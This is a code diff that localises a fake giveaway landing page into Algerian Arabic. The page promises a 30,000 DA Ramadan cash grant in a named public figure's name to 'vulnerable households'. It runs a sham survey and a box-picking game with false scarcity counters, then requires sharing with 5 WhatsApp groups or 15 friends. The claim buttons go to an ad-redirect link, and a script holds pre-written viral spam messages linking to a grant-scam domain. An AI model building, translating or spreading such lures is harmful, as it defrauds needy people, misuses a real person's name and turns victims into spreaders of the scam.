@@ -295,40 +295,39 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">مبروك! إجاباتك تسجلو</h2>
  
 <p class="paragraph">
-Now you have a chance to receive MOHAMED LAID BENAMOR 30,000 DA RAMADAN CASH SUPPORT<br><br>
-You have 3 chances ! we wish you good luck
+درك عندك فرصة باش تتحصل على MOHAMED LAID BENAMOR 30.000 دج دعم نقدي تاع رمضان<br><br>
+عندك 3 فرص ! نتمنالك الزهر
 <br><br>
-You need to select the box that has the gift inside the boxes.
+خاصك تختار العلبة لي فيها الهدية من بين العلب.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+إبدأ
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">حظ أوفر المرة الجاية</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+عندك (2) فرص إضافية. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
-OK
+موافق
 </button>
 </vue-modal>
 <vue-modal :open="showSuccessModal">
-<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTnMIj_7SUR2VMnkQH0YGhP-IV8IldyeNtRo1zJec26W8BuN-LZyOLu02qJL6GZDcFnYNrRxqF1O1ag2mHGF2m_f_sj8rHQheau3Ih31903L4ZG07YvKcTFd_Y7v9GuxbAPNqF0Qj7kmbKnwTLabnJ7EsZDqZIrn47fbfnY6KvcFVmL3jPU0CPKxyNpsBD/s16000/Captoooooure-removebg-preview.png" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS8_dWuf-2OAipG15_EsQfnRk_yFlZcI2WJ_bSqbWIhq0UeyUfwDT_7SqD45deQ2ynCkVm1gp_alu6b8k483_YrdCG6ThY5J7tPEcl5zUJj_Wkfk44qYOPwntFRuHNjk0K0rvuj0RJYHYx6II56ip3YkAcSQV7-m9Jt4VOrP8IMckCqUlhoAARLXs4AygB/s1600/Capfsdfdfture-removebg-preview.png" style="width: 240px;">
+<h1 class="heading heading--h1">مبروك! </h1>
 <p class="paragraph">
 
-
-Your Prize is: <b> 30,000 DA cash</b><br>Follow the instructions on the next page to claim your prize ! 
+الجائزة تاعك هي: <b> 30.000 دج كاش</b><br>تبع التعليمات في الصفحة الجاية باش تستلم الجائزة تاعك ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
-Ok
+موافق
 </button>
 </vue-modal>
   
@@ -341,74 +340,74 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNU5raYk3tldxGdoUBuwN54T3fBctWdwrxFBLV3s3d4ul4qwArWy3QbHc-y5mOUavHC5vBliDFWovdRdvxgTNwB1VxauK_kLXYIaVOUdbKUjIFGnfa3blLBl4jCGqtAwjhmwGzjJvD5vIVCDAVJ5-1vuPqQ34KGVNS8zuF1jScL3FzAXFNEjKQ2MFcHkMv/w640-h426/sjdaheu.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Hello!
+سلام!
 </h1>
   <p class="paragraph">
-Welcome to <b>30,000 DA MOHAMED LAID BENAMOR RAMADAN SUPPORT FOR ALL VULNERABLE HOUSEHOLDS/b>, Accept this MOHAMED LAID BENAMOR 2026 RAMADAN CASH SUPPORT FOR ALL VULNERABLE HOUSEHOLDS IN ALGERIA.
+مرحبا بيك في <b>30.000 دج MOHAMED LAID BENAMOR دعم رمضان لكل العائلات المحتاجة</b>، قبل MOHAMED LAID BENAMOR 2026 دعم نقدي تاع رمضان لكل العائلات المحتاجة في الجزائر.
 <br>
-Answer the questions below to claim <b>30,000 DA Cash Support</b>
+جاوب على الأسئلة لي تحت باش تتحصل على <b>30.000 دج دعم نقدي</b>
 </p>
   <br>
   
 </div>
 </div>
 <div class="right">
-<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://i.imgur.com/HSX0Uhw.png" box-image="https://i.imgur.com/45mMPJQ.png" box-back-image="https://i.imgur.com/HSmfDGb.png" prize-image="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTnMIj_7SUR2VMnkQH0YGhP-IV8IldyeNtRo1zJec26W8BuN-LZyOLu02qJL6GZDcFnYNrRxqF1O1ag2mHGF2m_f_sj8rHQheau3Ih31903L4ZG07YvKcTFd_Y7v9GuxbAPNqF0Qj7kmbKnwTLabnJ7EsZDqZIrn47fbfnY6KvcFVmL3jPU0CPKxyNpsBD/s16000/Captoooooure-removebg-preview.png" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+<vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://i.imgur.com/HSX0Uhw.png" box-image="https://i.imgur.com/45mMPJQ.png" box-back-image="https://i.imgur.com/HSmfDGb.png" prize-image="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS8_dWuf-2OAipG15_EsQfnRk_yFlZcI2WJ_bSqbWIhq0UeyUfwDT_7SqD45deQ2ynCkVm1gp_alu6b8k483_YrdCG6ThY5J7tPEcl5zUJj_Wkfk44qYOPwntFRuHNjk0K0rvuj0RJYHYx6II56ip3YkAcSQV7-m9Jt4VOrP8IMckCqUlhoAARLXs4AygB/s1600/Capfsdfdfture-removebg-preview.png" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "استنى شوية من فضلك...",
+              "استنى شوية من فضلك...",
+              "استنى شوية من فضلك..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+جاوبت على 4/4 أسئلة
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+راهي تتم معالجة إجاباتك
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+مازال كاين جوائز!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+راهم يقلبو على الهدايا.. 
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (389) gifts remain!
+بقاو غير (389) هدية!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
+راهم يتأكدو من المخزون
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a citizen of ALGERIA?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "واش أنت مواطن جزائري؟",
+              answers: [ { text: "نعم" }, { text: "لا" } ]
             },
                                                              {
-              title: "Do you have a ALGERIAN ID?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "عندك بطاقة تعريف جزائرية؟",
+              answers: [ { text: "نعم" }, { text: "لا" } ]
             },
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "اختار الجنس تاعك؟",
+              answers: [ { text: "ذكر" }, { text: "أنثى" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20 years" }, { text: "21 - 25 years" }, { text: "26 - 30 years" }, { text: "30 years Above" } ]
+              title: "اختار الفئة العمرية تاعك؟",
+              answers: [ { text: "18 - 20 سنة" }, { text: "21 - 25 سنة" }, { text: "26 - 30 سنة" }, { text: "30 سنة فما فوق" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -420,20 +419,20 @@ Stock is being checked
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>مبروك! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNU5raYk3tldxGdoUBuwN54T3fBctWdwrxFBLV3s3d4ul4qwArWy3QbHc-y5mOUavHC5vBliDFWovdRdvxgTNwB1VxauK_kLXYIaVOUdbKUjIFGnfa3blLBl4jCGqtAwjhmwGzjJvD5vIVCDAVJ5-1vuPqQ34KGVNS8zuF1jScL3FzAXFNEjKQ2MFcHkMv/w640-h426/sjdaheu.jpeg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>30,000 DA </b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">الجائزة تاعك هي: <b>30.000 دج </b> <br>تبع التعليمات لي تحت باش تستلم الجائزة تاعك !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1. Share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your Cash Grant</p></div>
+<div id="lastapp"><p class="rules">1. بارطاجي مع 5 مجموعات / 15 صاحب في "Whatsapp" (اضغط على أيقونة "Whatsapp" لي تحت)</p><p class="rules">2. اضغط على "مواصلة" واستلم المنحة النقدية تاعك</p></div>
 
     
-   <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+   <div class="share_main_bt" id="whatsapp">Whatsapp&nbsp;   →</div>
+  <h4 class="textlastup">بارطاجي حتى يعمر الشريط الأزرق!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -444,7 +443,7 @@ Stock is being checked
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Continue
+                                مواصلة
                             </div>
    
   </div></div>
@@ -457,32 +456,32 @@ Stock is being checked
                       
     <div id="claim">
       <div class="title1">
-<p>Congratulations! </p>
+<p>مبروك! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
-                                <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTnMIj_7SUR2VMnkQH0YGhP-IV8IldyeNtRo1zJec26W8BuN-LZyOLu02qJL6GZDcFnYNrRxqF1O1ag2mHGF2m_f_sj8rHQheau3Ih31903L4ZG07YvKcTFd_Y7v9GuxbAPNqF0Qj7kmbKnwTLabnJ7EsZDqZIrn47fbfnY6KvcFVmL3jPU0CPKxyNpsBD/s16000/Captoooooure-removebg-preview.png" width='81%'/> </center>
+                                <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS8_dWuf-2OAipG15_EsQfnRk_yFlZcI2WJ_bSqbWIhq0UeyUfwDT_7SqD45deQ2ynCkVm1gp_alu6b8k483_YrdCG6ThY5J7tPEcl5zUJj_Wkfk44qYOPwntFRuHNjk0K0rvuj0RJYHYx6II56ip3YkAcSQV7-m9Jt4VOrP8IMckCqUlhoAARLXs4AygB/s1600/Capfsdfdfture-removebg-preview.png" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>30,000 DA  cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">الجائزة تاعك هي: <b>30.000 دج كاش.</b> <br>تبع التعليمات لي تحت باش تستلم الجائزة تاعك !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('https://obqj2.com/4/1322937')" href="" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM 30,000 DA </font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">استلم 30.000 دج </font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
+      <div class="share_main_bt" id="offer">اختار نوع الحساب</div><br/> <br/>
 
 	     <a  onclick="window.open('https://obqj2.com/4/1322937')" href="" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">حساب توفير</font></button>
                     </a><br/> <br/>
  <a  onclick="window.open('https://obqj2.com/4/1322937')" href="" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CURRENT</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">حساب جاري</font></button>
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw 30,000 DA </div> 
+            <div class="share_main_bt" id="offers">اسحب 30.000 دج </div>
       <br>
           
        
@@ -535,7 +534,7 @@ function go() {
 
 <script>
   var tiaoban = [
-"If You Missed before%0A%0A*Don't miss this MOHAMED LAID BENAMOR 30,000 DA RAMADAN CASH SUPPORT - SUPPORT For All VULNERABLE HOUSEHOLDS IN ALGERIA%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 30,000 DA instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html ",
+"إلا فاتك من قبل%0A%0A*ما تفوتش هاذ محمد لعيد بن عمر 30,000 دج دعم نقدي تاع رمضان - دعم لكل العائلات الهشّة في الجزائر%0A%0A*كيفاش تتحصل عليه*%0Aزور الرابط اللي لتحت وجاوب على الأسئلة التالية وتتحصل على 30,000 دج دُغري اليوم.%0A راني تحصّلت على حقي%0A%0Aكليك هنا👇%0A https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html ",
 "If You Missed before%0A%0A*Don't miss this MOHAMED LAID BENAMOR 30,000 DA RAMADAN CASH SUPPORT - SUPPORT For All VULNERABLE HOUSEHOLDS IN ALGERIA%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 30,000 DA instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html ",
 "If You Missed before%0A%0A*Don't miss this MOHAMED LAID BENAMOR 30,000 DA RAMADAN CASH SUPPORT - SUPPORT For All VULNERABLE HOUSEHOLDS IN ALGERIA%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 30,000 DA instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html ",
 "If You Missed before%0A%0A*Don't miss this MOHAMED LAID BENAMOR 30,000 DA RAMADAN CASH SUPPORT - SUPPORT For All VULNERABLE HOUSEHOLDS IN ALGERIA%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 30,000 DA instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Ghribi-50,000Tnd-Kamel.html ",
